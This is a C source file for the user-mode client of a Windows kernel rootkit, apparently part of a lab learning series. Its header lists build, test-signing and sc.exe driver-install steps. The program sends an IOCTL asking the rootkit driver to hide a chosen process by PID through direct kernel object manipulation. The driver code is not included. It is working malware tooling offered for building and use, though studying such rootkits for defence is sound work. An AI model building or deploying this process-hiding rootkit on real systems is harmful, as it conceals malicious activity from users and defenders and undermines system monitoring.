// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



// Name:							KernelRootkit006_DKOM
// IDE:								Open Visual Studio
// Template:						Create a new project -> Search for templates (Alt + S) -> Console App -> Next
// Project:							Project Name: ConsoleApp_DKOM -> Solution Name: KernelRootkit006_DKOM -> Create
// Source File:						In Solution Explorer -> Find ConsoleApp_DKOM.cpp -> Rename to Application.c
// Source Code:						Open Application.c and copy the corresponding source code
// Build Project:					Set Configuration to Release, x64 -> Build -> Build Solution
// Add Project:						In Solution Explorer -> Right-click the solution (KernelRootkit006_DKOM) -> Add -> New Project...
// Template:						Search for templates (Alt + S) -> Kernel Mode Driver, Empty (KMDF) -> Next
// Project:							Project name: KMDFDriver_DKOM -> Create
// Source File:						Source Files -> Add -> New Item... -> Driver.c
// Source Code:						Open Driver.c and copy the corresponding source code
// Build Project:					Set Configuration to Release, x64 -> Build -> Build Solution
// Locate App:						C:\Users\%USERNAME%\source\repos\KernelRootkit006_DKOM\x64\Release\ConsoleApp_DKOM.exe
// Locate Driver:					C:\Users\%USERNAME%\source\repos\KernelRootkit006_DKOM\x64\Release\KMDFDriver_DKOM.sys
// Virtual Machine:					Open VMware Workstation -> Power on (MalwareWindows11) virtual machine
// Move App:						Move ConsoleApp_DKOM.exe (Host) to C:\Users\%USERNAME%\Downloads\ConsoleApp_DKOM.exe (VM)
// Move Driver:						Copy KMDFDriver_DKOM.sys (Host) to C:\Users\%USERNAME%\Downloads\KMDFDriver_DKOM.sys (VM)
// Enable Test Mode:				Open a CMD window as Administrator -> bcdedit /set testsigning on -> Restart
// Driver Installation:				Open a CMD window as Administrator -> sc.exe create WindowsKernelDKOM type=kernel start=demand binpath="C:\Users\%USERNAME%\Downloads\KMDFDriver_DKOM.sys"
// Registered Driver:				Open AutoRuns as Administrator -> Navigate to the Drivers tab -> Look for WindowsKernelDKOM
// Service Status:					Run in CMD as Administrator -> sc.exe query WindowsKernelDKOM -> driverquery.exe
// Registry Entry:					Open regedit -> Navigate to HKLM\SYSTEM\CurrentControlSet\Services -> Look for WindowsKernelDKOM
// Monitor Messages:				Open DebugView as Administrator -> Enable options ("Capture -> Capture Kernel" and "Capture -> Enable Verbose Kernel Output") -> Close and reopen DebugView as Administrator
// Start Routine:					Run in CMD as Administrator -> sc.exe start WindowsKernelDKOM
// User Mode App:					Open CMD -> Navigate to the directory -> Run ConsoleApp_DKOM.exe
// Clean:							Run in CMD as Administrator -> sc.exe stop WindowsKernelDKOM
// Remove:							Run in CMD as Administrator -> sc.exe delete WindowsKernelDKOM



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://en.wikibooks.org/wiki/Windows_Programming/windows.h
// The primary C header file for accessing the Win32 API is the <windows.h> header file. To make a Win32 executable, the first step is to include this header file in your source code. The windows.h header file should be included before any other library include, even the C standard library files such as stdio.h or stdlib.h. This is because the windows.h file includes macros and other components that may modify, extend, or replace things in these libraries. This is especially true when dealing with UNICODE, because windows.h will cause all the string functions to use UNICODE instead. Also, because many of the standard C library functions are already included in the Windows kernel, many of these functions will be available to the programmer without needing to load the standard libraries. For example, the function sprintf is included in windows.h automatically. 
#include <windows.h>

// https://en.wikibooks.org/wiki/C_Programming/stdio.h
// The C programming language provides many standard library functions for file input and output. These functions make up the bulk of the C standard library header <stdio.h>. The I/O functionality of C is fairly low-level by modern standards; C abstracts all file operations into operations on streams of bytes, which may be "input streams" or "output streams". Unlike some earlier programming languages, C has no direct support for random-access data files; to read from a record in the middle of a file, the programmer must create a stream, seek to the middle of the file, and then read bytes in sequence from the stream. 
#include <stdio.h>

// https://en.wikibooks.org/wiki/C_Programming/string.h
// String.h is the header in the C standard library for the C programming language which contains macro definitions, constants and declarations of functions and types used not only for string handling but also various memory handling functions; the name is thus something of a misnomer. 
#include <string.h>



// START -> MACROS ----------------------------------------------------------------------------------------------------------------------------
// START -> MACROS ----------------------------------------------------------------------------------------------------------------------------



/**
	@brief		An I/O control code is a 32-bit value that consists of several fields (https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/defining-i-o-control-codes).

				When defining new IOCTLs, it is important to remember the following rules:

					- If a new IOCTL will be available to user-mode software components, the IOCTL must be used with IRP_MJ_DEVICE_CONTROL requests. User-mode components send IRP_MJ_DEVICE_CONTROL requests by calling the DeviceIoControl, which is a Win32 function.
					- If a new IOCTL will be available only to kernel-mode driver components, the IOCTL must be used with IRP_MJ_INTERNAL_DEVICE_CONTROL requests. Kernel-mode components create IRP_MJ_INTERNAL_DEVICE_CONTROL requests by calling IoBuildDeviceIoControlRequest.

				Use the system-supplied CTL_CODE macro, which is defined in Wdm.h and Ntddk.h, to define new I/O control codes. The definition of a new IOCTL code, whether intended for use with IRP_MJ_DEVICE_CONTROL or IRP_MJ_INTERNAL_DEVICE_CONTROL requests, uses the following format:

				#define IOCTL_Device_Function CTL_CODE(DeviceType, Function, Method, Access)


				Supply the following parameters to the CTL_CODE macro:

				DeviceType			This value must match the value that is set in the DeviceType member of the driver's DEVICE_OBJECT structure (https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/specifying-device-types).

				FunctionCode		Identifies the function to be performed by the driver. Values of less than 0x800 are reserved for Microsoft. Values of 0x800 and higher can be used by vendors.

				TransferType		Indicates how the system will pass data between the caller of DeviceIoControl (or IoBuildDeviceIoControlRequest) and the driver that handles the IRP (METHOD_BUFFERED, METHOD_IN_DIRECT, METHOD_OUT_DIRECT, METHOD_NEITHER).

				RequiredAccess		Indicates the type of access that a caller must request when opening the file object that represents the device (FILE_ANY_ACCESS, FILE_READ_DATA, FILE_READ_DATA, FILE_READ_DATA and FILE_WRITE_DATA).
**/
#define IOCTL_HIDE_PROCESS_BY_PID CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	Prints a banner with application details and a welcome message
**/
void PrintBanner()
{
	printf("\n");
	printf("=================================================================================================================\n");
	printf("                               Benthic Zone UserModeKernelModeCommunication DKOM                                 \n");
	printf("=================================================================================================================\n");
	printf("             This application interacts with a kernel-mode driver to manipulate process visibility.              \n");
	printf("              Use the available options to hide processes, or list active processes in user mode.                \n");
	printf("=================================================================================================================\n");
	printf(".................................................................................................................\n");
	printf("=================================================================================================================\n");
	printf("                                         Explanation of DKOM Commands                                            \n");
	printf("=================================================================================================================\n");
	printf(" --kernel hide_process_by_pid <PID>:  Hides a process given its PID via Direct Kernel Object Manipulation (DKOM).\n");
	printf(" --user list_processes:               Lists all running processes in user mode.                                  \n");
	printf(" --help:                              Displays this help menu.                                                   \n");
	printf("=================================================================================================================\n");
	printf("\n");
}



/**
	Main entry point
**/
int main(int argc, char* argv[])
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello


	// ---------------------------------------------------------------------------------------------------------------------
	// No arguments
	if (argc < 2)
	{
		printf("Benthic Zone DKOM -> ConsoleAppDKOM [Application.c] (main) - ERROR: No arguments provided. Use --help for usage instructions.\n");
		return 1;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Help
	else if (strcmp(argv[1], "--help") == 0)
	{
		PrintBanner();
		return 0;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// User
	else if (strcmp(argv[1], "--user") == 0)
	{


		// -----------------------------------------------------------------------------------------------------------------
		// List active processes
		if (strcmp(argv[2], "list_processes") == 0)
		{
			printf("Benthic Zone DKOM -> ConsoleAppDKOM [Application.c] (main) - List active processes\n");
			system("tasklist");
			return 0;
		}
		// -----------------------------------------------------------------------------------------------------------------
		// Future user commands
		else {
			printf("Benthic Zone DKOM -> ConsoleAppDKOM [Application.c] (main) - ERROR: Invalid user command. Use --help for usage instructions.\n");
			return 1;
		}
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Kernel
	else if (strcmp(argv[1], "--kernel") == 0)
	{


		// -----------------------------------------------------------------------------------------------------------------
		// Open I/O device

		// The function returns a handle that can be used to access the file or device for various types of I/O depending on the file or device and the flags and attributes specified.
		// https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea
		HANDLE hDevice = CreateFile(L"\\\\.\\MyKernelDriverDKOM", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
		
		// Error
		if (hDevice == INVALID_HANDLE_VALUE)
		{
			printf("Benthic Zone DKOM -> ConsoleAppDKOM [Application.c] (main) - ERROR: Failed to access the device (MyKernelDriverDKOM). Please make sure the driver is installed.\n");
			return 1;
		}


		// -----------------------------------------------------------------------------------------------------------------
		// Hide Process By Pid
		if (strcmp(argv[2], "hide_process_by_pid") == 0 && argc == 4)
		{
			// Variables
			char inBuffer[MAX_PATH] = { 0 };			// Input buffer for data to be sent to the driver
			char outBuffer[MAX_PATH] = { 0 };			// Output buffer for data received from the driver
			DWORD bytesReturned;						// Stores the number of bytes returned
			BOOL success;								// Indicates the success of an operation
			DWORD pid = atoi(argv[3]);					// Convert argument to process ID (PID)
			memcpy(inBuffer, &pid, sizeof(DWORD));		// Copy PID into input buffer

			// Sends a control code directly to a specified device driver, causing the corresponding device to perform the corresponding operation.
			// https://learn.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol
			success = DeviceIoControl(hDevice, IOCTL_HIDE_PROCESS_BY_PID, inBuffer, sizeof(DWORD), outBuffer, sizeof(outBuffer), &bytesReturned, NULL);
			if (success)
			{
				printf("Benthic Zone DKOM -> ConsoleAppDKOM [Application.c] (main) - IOCTL_HIDE_PROCESS_BY_PID sent successfully\n");
				printf("Benthic Zone DKOM -> ConsoleAppDKOM [Application.c] (main) - Request to hide process with PID %lu has been sent successfully\n", pid);
				printf("Benthic Zone DKOM -> ConsoleAppDKOM [Application.c] (main) - Driver response: %s\n", outBuffer);
			}
			else
			{
				printf("Benthic Zone DKOM -> ConsoleAppDKOM [Application.c] (main) - ERROR: Error sending IOCTL_HIDE_PROCESS_BY_PID. Code: %lu\n", GetLastError());
				printf("Benthic Zone DKOM -> ConsoleAppDKOM [Application.c] (main) - ERROR: Failed to hide process with PID %lu\n", pid);
				printf("Benthic Zone DKOM -> ConsoleAppDKOM [Application.c] (main) - ERROR: Driver response: %s\n", outBuffer);
			}
		}
		// -----------------------------------------------------------------------------------------------------------------
		// Future kernel commands
		else {
			printf("Benthic Zone DKOM -> ConsoleAppDKOM [Application.c] (main) - ERROR: Invalid kernel command. Use --help for usage instructions.\n");
			CloseHandle(hDevice);
			return 1;
		}


		// Closes an open object handle.
		// https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle
		CloseHandle(hDevice);
		return 0;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Invalid command
	else {
		printf("Benthic Zone DKOM -> ConsoleAppDKOM [Application.c] (main) - ERROR: Invalid command. Use --help for usage instructions.\n");
		return 1;
	}
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------